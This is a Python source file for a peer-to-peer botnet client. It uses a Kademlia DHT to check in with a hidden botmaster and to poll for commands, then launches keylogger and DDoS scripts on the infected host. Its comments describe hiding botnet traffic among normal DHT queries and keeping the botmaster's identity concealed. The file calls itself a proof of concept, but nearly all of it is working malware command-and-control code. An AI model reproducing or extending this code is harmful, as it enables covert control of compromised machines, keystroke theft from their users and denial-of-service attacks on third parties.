from twisted.internet import reactor, task, defer
from twisted.python import log
from kademlia.network import Server
from collections import Counter
import subprocess, time, sys, hashlib, time
#these imports below are our own scripts that are run as commands
import keylogger,ddos

# I'm using a kademlia DHT protocol. I built most of this on top of Brian Muller's kademlia python implementation which
# he so graciously provided free of charge. https://github.com/bmuller/kademlia I chose kademlia over chord because it has some advantages in both simplicity
# and its routing and distance function implementations. Everything is running UDP with the twisted framework.
# If I had time I'd rebuild this into it's own twisted protocol but for a basic client this is all that's needed.
# The clients (bot and command) need a server to bootstrap off of, but this could be taken away if you wanted to connect
# to any existing kademlia network. I got a lot of inspiration from the Overlord botnet which uses an existing
# kademlia network, and blends in with the normal traffic because all of the traffic appears as normal DHT queries.
# I'm using deferred chains due to the asynchronous aspects of the underlying p2p network.
# Due to the design of the architecture, this should work through NAT as well. 

log.startLogging(sys.stdout)

if len(sys.argv) != 4:
	print "Usage: python botnet.py <bootstrap ip> <bootstrap port> <bot port>"
	exit(0)
bootstrap_ip = str(sys.argv[1])
port = int(sys.argv[2])
myport = int(sys.argv[3])


#object that stores info for this node.
class botnode:
	def __init__(self,ip,port,network_id,idhash):
		self.ip = ip
		self.port = port
		self.id = network_id
		#this will store all the child processes that are started (aka our attack scripts like ddos or keylogging). Might need to do something with them later
		self.pgroup = []
		#don't want to have multiple instances of the same program runnings to I'm using a dict to track them
		self.cmdsrun = {'DDOS':False,'SHELL':False,'DOWNLOAD':False,'KEYLOG':False}
		#cmdkey is the hash of the nodes bot id
		self.cmdkey = idhash

#hash function thats used in the DHT process
def get_hash(prehash):
	m = hashlib.sha1()
	m.update(prehash)
	return m.hexdigest()


#helper function to get most common element in a list
def most_common(list):
	data = Counter(list)
	return data.most_common(1)[0][0]

#End of deferred chain to execute commands once they've been received
def get_cmd(value,server,bot):
	commands = ['DDOS','DOWNLOAD','KEYLOG']
	try:
		x = value.split()
		cmd = x[0]
		if cmd in commands:
			if cmd == 'KEYLOG':
				if bot.cmdsrun['KEYLOG'] is False:
					tmp = 'python keylogger.py {0}'.format(bot.cmdkey)
					print "Starting keylogger"
					process=subprocess.Popen(tmp.split(),shell=False)
					bot.pgroup.append(process)
					bot.cmdsrun['KEYLOG'] = True
			if cmd == 'DDOS':
				if bot.cmdsrun['DDOS'] is False:
					tmp = 'python ddos.py {0}'.format(' '.join(x[1:]))
					print "Starting DDOS on {0}".format(tmp)
					process=subprocess.Popen(tmp.split(),shell=False)
					bot.cmdsrun['DDOS'] = True
			#can add any arbitrary command we want
			else:
				print 'Feel free to implement your own commands!'

	except Exception, e:
		pass
			

#checks the bots unique command location for a command
#by using DHT to store commands, the bots never know who the botmaster actually is
#the security can be increased by using encryption and a few other things, but this is just a proof of concept
def wait_cmd(server,bot):
	print "Checking for command"
	server.get(bot.cmdkey).addCallback(get_cmd,server,bot)

#this function is part of a deferred chain to check in with the botmaster after joining a network
#It's never a direct connection to the master, and the bots dont know about other bots or the master.
#They only know where to check in, and where to grab their commands from
def ack_valid(value,server,bot):
	#t = hashlib.sha1().update('ack')
	if value!=str(bot.id):
		callhome(server,bot)
		print "no ack"
	else:
		print "we have an ack"
		cmdloop = task.LoopingCall(wait_cmd,server,bot)
		cmdloop.start(5)
		#wait_cmd(None,server,bot)

def check_ack(result,server,bot):
	mykey = hashlib.sha1()
	mykey.update(bot.id)
	server.get(mykey.hexdigest()).addCallback(ack_valid,server,bot)

def callhome(server,bot):
	key = hashlib.sha1()
	key.update('specialstring')
	#announce to master that we exist, then check for ack
	server.set(key.hexdigest(),str(bot.id)).addCallback(check_ack,server,bot)

def setup(ip_list, server):
	#check that it got a result back
	#print str(server.node.long_id)
	if not len(ip_list):
		print "Could not determine my ip, retrying"
		server.inetVisibleIP().addCallback(setup,server)
	myip = most_common(ip_list)
	idhash = get_hash(str(server.node.long_id))
	bot = botnode(myip,port,str(server.node.long_id),idhash)
	callhome(server,bot)

def bootstrapDone(found, server):
    if len(found) == 0:
        print "Could not connect to the bootstrap server."
        reactor.stop()
        exit(0)
    server.inetVisibleIP().addCallback(setup,server)



server = Server()
server.listen(myport)
server.bootstrap([(bootstrap_ip, port)]).addCallback(bootstrapDone, server)
reactor.run()

#bootstrap is at 192.168.56.101:8468

